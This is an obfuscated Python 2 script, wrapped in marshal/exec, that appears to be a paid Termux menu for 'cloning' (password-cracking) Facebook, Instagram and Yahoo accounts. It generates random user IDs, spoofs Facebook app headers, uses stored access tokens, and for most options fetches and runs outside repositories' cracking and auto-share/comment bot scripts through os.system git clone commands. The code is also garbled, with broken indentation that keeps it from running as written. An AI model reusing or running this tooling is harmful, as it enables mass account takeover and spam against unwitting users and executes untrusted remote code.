import marshal
exec(marshal.loads(b'sk4\x00\x00import os\r\nimport time\r\nimport requests\r\nimport datetime\r\nimport random\r\nimport multiprocessing.pool as multiprocessing\r\nimport getpass\r\nimport json\r\nimport threading\r\nimport sys\r\nimport uuid\r\nimport shutil\r\nimport zlib\r\nimport base64\r\nfrom multiprocessing.pool import ThreadPool\r\nfrom requests.exceptions import ConnectionError\r\nos.system(\'rm -rf .txt\')\r\nfor n in range(5000):\r\n    nmbr = random.randint(1111111, 9999999)\r\n    sys.stdout = open(\'.txt\', \'a\')\r\n    print nmbr\r\n    sys.stdout.flush()\r\n\r\nl1 = \'100077\'\r\nl2 = \'100078\'\r\nos.system(\'rm -rf token.txt\')\r\ng = \'\\x1b[1;92m\'\r\nr = \'\\x1b[1;91m\'\r\nw = \'\\x1b[1;97m\'\r\ny = \'\\x1b[1;93m\'\r\nn = \'\\x1b[1;94m\'\r\ngu = \'\\x1b[1;95m\'\r\nsm = \'\\x1b[1;96m\'\r\n\r\ntry:\r\n    import lolcat\r\nexcept:\r\n    os.system(\'pip2 install lolcat\')\r\n\r\nlogo = "\\33[93m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     \\n\\033[91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \\n\\33[97m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[96m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[0;35m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\\033[0m   Author      :     MAHDI HASAN     \\n\'\\x1b[1;92m\'   Github      :     MAHDI SHUVO  \\n\'\\x1b[1;93m\'   FB        :     https://web.facebook.com/m.mahdi.80\\n\'\\x1b[1;94m\'   TOOL TYPE   :     PAID COMMANDS\\n\'\\x1b[1;96m\'   WAP NUMBER  :     01887408882            \\n"\r\ndec = \'2\'\r\nserver = \'2\'\r\nrsauser = \'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]\'\r\nheader = {\r\n    \'x-fb-connection-bandwidth\': str(random.randint(2e+07, 3e+07)),\r\n    \'x-fb-sim-hni\': str(random.randint(20000, 40000)),\r\n    \'x-fb-net-hni\': str(random.randint(20000, 40000)),\r\n    \'x-fb-connection-quality\': \'EXCELLENT\',\r\n    \'x-fb-connection-type\': \'cell.CTRadioAccessTechnologyHSDPA\',\r\n    \'user-agent\': rsauser,\r\n    \'content-type\': \'application/x-www-form-urlencoded\',\r\n    \'x-fb-http-engine\': \'Liger\' }\r\nreload(sys)\r\nsys.setdefaultencoding(\'utf8\')\r\nfuck = []\r\nidx = []\r\noks = []\r\ncps = []\r\n\r\ndef main_apv():\r\n    imt = \'+MAHDI==\'\r\n    os.system(\'clear\')\r\n    print logo\r\n    \r\n    try:\r\n        key1 = open(\'/sdcard/.android.txt\', \'r\').read()\r\n    except IOError:\r\n        os.system(\'clear\')\r\n        print logo\r\n        print (\'           You dont have subscrption\')\r\n        print (\'           Hello Dear Ya Cammonds Paid Han Or\')\r\n        print (\'           Ap Ke Subscription Nhi Ha Please Ap\')\r\n        print (\'           Admin Sa Rabta Kran Thanks\')\r\n        print (\'           Subscription Kelya Enter Press Kro\')\r\n        print (\'           Or Whatsapp Pa Rabta Kro Thanks\')\r\n       \r\n        myid = uuid.uuid4().hex[:10]\r\n        print \'         YOUR KEY : \' + myid + imt\r\n        kok = open(\'/sdcard/.android.txt\', \'w\')\r\n        kok.write(myid + imt)\r\n        kok.close()\r\n        print \'\'\r\n        print (\'           Ya Uper Wale Ap Ke KEY Ha\')\r\n        print (\'           Copy Kar Ka WhatsApp Pa Bhaj Dena\')\r\n       \r\n        print \'     Agar Ap Na Subscription Kar Le Ha To\')\r\n        raw_input(\'    Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio \')\r\n        os.system(\'xdg-open https://wa.me/+8801887408882\')\r\n\r\n    r1 = requests.get(\'https://raw.githubusercontent.com/MAHDI-Shuvo/Mahdipaid1/main/mahdi.text\').text\r\n    if key1 in r1:\r\n        main_system()\r\n    else:\r\n        os.system(\'clear\')\r\n        print logo\r\n        print (\'           You dont have subscrption\')\r\n        print (\'           Hello Dear Ya Cammonds Paid Han Or\')\r\n        print (\'           Ap Ke Subscription Nhi Ha Please Ap\')\r\n        print (\'           Admin Sa Rabta Kran Thanks\')\r\n        print (\'           Subscription Kelya Enter Press Kro\')\r\n        print (\'           Or Whatsapp Pa Rabta Kro Thanks\')\r\n        print \'\'\r\n        print (\'         YOUR KEY : \' + key1)\r\n        print \'\'\r\n        print (\'           Ya Uper Wale Ap Ke KEY Ha\')\r\n        print (\'           Copy Kar Ka WhatsApp Pa Bhaj Dena\')\r\n       \r\n        print (\'     Agar Ap Na Subscription Kar Le Ha To\')\r\n        raw_input(\'    Termux Sa Exit Kar Ka Phir Sa Cammonds Lagio \')\r\n        os.system(\'xdg-open https://wa.me/+8801887408882\')\r\n\r\n\r\ndef main_system():\r\n    \r\n    try:\r\n        token = open(\'token.txt\', \'r\').read()\r\n    except:\r\n        pass\r\n\r\n    \r\n    try:\r\n        r = requests.get(\'https://graph.facebook.com/me?access_token=\' + token)\r\n        q = json.loads(r.text)\r\n        m = q[\'name\']\r\n        \r\n    except requests.exceptions.ConnectionError:\r\n        \r\nprint logo\r\nprint (\'Trun On Data An Then \\t\')\r\n       \r\n    except:\r\n        print (\'\\x1b[1;91mToken on Chekpiont \')\r\n        os.system(\'rm -rf token.txt\')\r\n\r\n    os.system(\'clear\')\r\n    \r\nprint("""\\33[93m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97   \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x95\x97     \\n\\033[91m\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97 \xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x97\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[1;32m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91   \\n\\33[97m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x95\x9a\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x90\xe2\x95\x90\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[96m\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91 \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91  \xe2\x96\x88\xe2\x96\x88\xe2\x95\x91\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x96\x88\xe2\x95\x94\xe2\x95\x9d\xe2\x96\x88\xe2\x96\x88\xe2\x95\x91    \\n\\033[0;35m\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d     \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\xe2\x95\x9a\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x90\xe2\x95\x9d \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d\\033[0m \r\n\\033[0m================================================================\r\n\\33[93mAUTHOR :\\033[91m[MAHDI HASAN] SHUVO\r\n\\033[0;33mGITHUB : \\033[1;97mhttps://github.com/====\r\n\\033[1;31mFb ; https://web.facebook.com/mahdihasan.80\r\n\\033[1;33mLIVE in Sylhet (Read in class 10)\r\n\\033[42mNo NEED GF \\033[0;31mIF YOU LOVE ME I LOVE YOU IF U HAT ME I FUCK YOU \r\n\\033[0;36m================================================================""")\r\nprint("""\r\n\\033[1;36m[1]CLONE FROM2006- 2009 ID\r\n\\033[1;32m[2]CLONE FROM 2009 ID \r\n\\033[1;88m[3]CLONE FROM 2010-2020 ID\r\n\\033[1;33m[4]CLONE FROM  BANGLADESH 6DIG[All SIM]\r\n\\033[1;32m[5]CLONE FROM INSTRAGAM ID\r\n\\033[1;33m[6]CLONE FROM FRIENDLIST (NEED TOKEN)\r\n\\033[1;36m[7]CLONE FROM  PUBLICK ID v2\r\n\\033[1;32m[8]CLONE FROM ID BANGLADESH 11DIG[All SIM]\r\n\\033[1;33m[9]CLONE FROM NUMBER BD\r\n\\033[1;88m[10]CLONE FROM FREOM PAKISTAN \r\n\\033[1;88m[11]CLONE FROM FROM INDIA\r\n\\033[0;33m[12]CLONE FROM AFGHANISTAN \r\n\\033[0;88m[13]CLONE FROM FREOM PAKISTAN V2(All SIM)\r\n\\033[1;33m[14]CLONE FROM FREOM File Creating\r\n\\033[1;35m[15]CLONE FROM LATEST FB CRACKING LOGIN\r\n\\033[1;33m[16]CLONE FROM ID BANGLADESH 9DIG (All SIM)\r\n\\033[1;32m[17]CLONE FROM 2009 ID [MAO]\r\n\\033[1;37m[18]FB AUTO SHARE (need TOKEN)\r\n\\033[1;33m[19]FB AUTO COMMENT(need TOKEN)\r\n\\033[1;33m[20]CLONE YAHOO \r\n\\033[1;36m[21]CLONE FROM  PUBLICK ID  (Best) v2\r\n\\033[1;36m[22]CLONE FROM  PUBLICK ID  (best) v2\r\n\\033[1;33m[23]CLONE FROM FREOM File Creating V\r\n\\033[1;36m[24]CLONE FROM2003- 2005 ID\r\n""")\r\npil = input("\\033[1;97m[\\033[1;94m?\\033[1;97m] CHOOSE: ")\r\n\r\nif pil in ["01", "1"]:\r\n\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4\')\r\n    os.system(\'python2 mahdi9.py\')\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\n\r\nelif pil in ["02", "2"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4\')\r\n    os.system(\'python 20091st.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\n\r\n\r\n\r\nelif pil in ["03", "3"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4\')\r\n    os.system(\'python2 pakistan.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\nelif pil in ["04", "4"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4\')\r\n    os.system(\'python2 BD6.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\n\r\n\r\n\r\nelif pil in ["05", "5"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/paidfree4 && python instragam.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\nelif pil in ["06", "6"]:\r\n    os.system(\'pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat\')\r\n    os.system(\'python Nx.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\n\r\nelif pil in ["07", "7"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4\')\r\n    os.system(\'python Prem.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\nelif pil in ["08", "8"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4\')\r\n    os.system(\'python2 BD11.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\nelif pil in ["09", "9"]:\r\n    os.system(\'git clone https://github.com/Azim-vau/smbf.git && cd smbf\')\r\n    os.system(\'python2 smbf.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\nelif pil in ["10"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4 && python2 pakistan.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\n\t\r\n\t\r\nelif pil in ["11"]:\r\n    os.system(\'pkg update ; pkg upgrade ; pkg install python ; pkg install python2 ; pip2 install requests ; pip2 install mechanize ; pip2 install bs4 ; pkg install git ; git clone https://github.com/Azim-vau/clone-india.git ; cd clone-india ; python2 india.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\t\r\nelif pil in ["12"]:\r\n\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4 && python2 Mahadi-Afg.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\nelif pil in ["13"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/paidfree4 && cd paidfree4\')\r\n    os.system(\'python mahdi2.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\n\r\nelif pil in ["14"]:\r\n    os.system(\'git clone https:/github.com/James404-cyber/DUM-ID.git\')\r\n    os.system(\'cd DUM-ID && python Doubled.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    main()\r\n\r\nelif pil in ["15"]:\r\n    os.system(\'pkg install nodejs -y && pip install requests bs4 futures mechanize && rm -rf qurat && git clone https://github.com/Qurat677/qurat.git && cd qurat\')\r\n    system(\'python Nx.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n    \r\nelif pil in ["16"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/shuvook.git && cd shuvook && python2 bd9.py cvx\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\nelif pil in ["17"]:\r\n    os.system(\'pip2 install mclone\')\r\n    os.system(\'mclone\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\nelif pil in ["18"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/fbboT && cd fbboT && python mahdi.py\')\r\n    \r\nelif pil in ["19"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/fbboT && cd fbboT && python autocomment.py\')\r\n  \r\n\t\r\nelif pil in ["20"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/texs && cd texs && python yahoo.py\')\t\r\n\r\nelif pil in ["20"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/texs && cd texs && python \')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\t\r\n\r\nelif pil in ["21"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/mall && cd mall && python Adf.py \')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\n\t\r\nelif pil in ["22"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/mall && cd mall && python Juttbrand.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\t\r\nelif pil in ["23"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/mall && cd mall && python2 file.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2)\r\nelif pil in ["24"]:\r\n    os.system(\'git clone https://github.com/Shuvo-BBHH/texs && cd texs && python2 811.py\')\r\n    time.sleep(2)\r\n    print(" ")\r\n    n = input("[ \\n\\033[1;94mBACK \\n\\033[1;97m]")\r\n    time.sleep(2) '))